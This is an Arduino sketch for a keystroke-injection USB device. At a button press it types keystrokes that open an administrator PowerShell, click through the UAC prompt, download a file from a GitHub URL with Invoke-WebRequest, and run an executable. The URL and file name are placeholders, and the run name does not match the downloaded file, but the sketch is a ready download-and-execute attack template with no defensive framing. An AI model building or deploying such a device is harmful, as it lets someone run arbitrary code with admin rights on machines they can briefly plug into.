/* 
Windows injection sequence
Commands to open Powershell, download a file from Github, and run the file

Keystroke sequence:
- Open Powershell
- Download file
- Run file
*/
#include <Keyboard.h>

int hasRun = 0;
String download = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/octocat/Spoon-Knife/master/LICENSE\" -OutFile \"LICENSE\"";
String run = "filename.exe";

void setup() {
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  delay(800);
  //if the button is pressed
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
    // Begin keystroke sequence
    // Open Powershell as admin
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.print("powershell");
    delay(500); // let animation play

    Keyboard.press(KEY_RIGHT_ARROW);
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2500); // let animation play, UAC takes forever to come up

    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Download file
    Keyboard.print(download);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Run file
    Keyboard.print(run);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    Keyboard.end(); // end keyboard emulation
    hasRun = 1;
    }
  }
}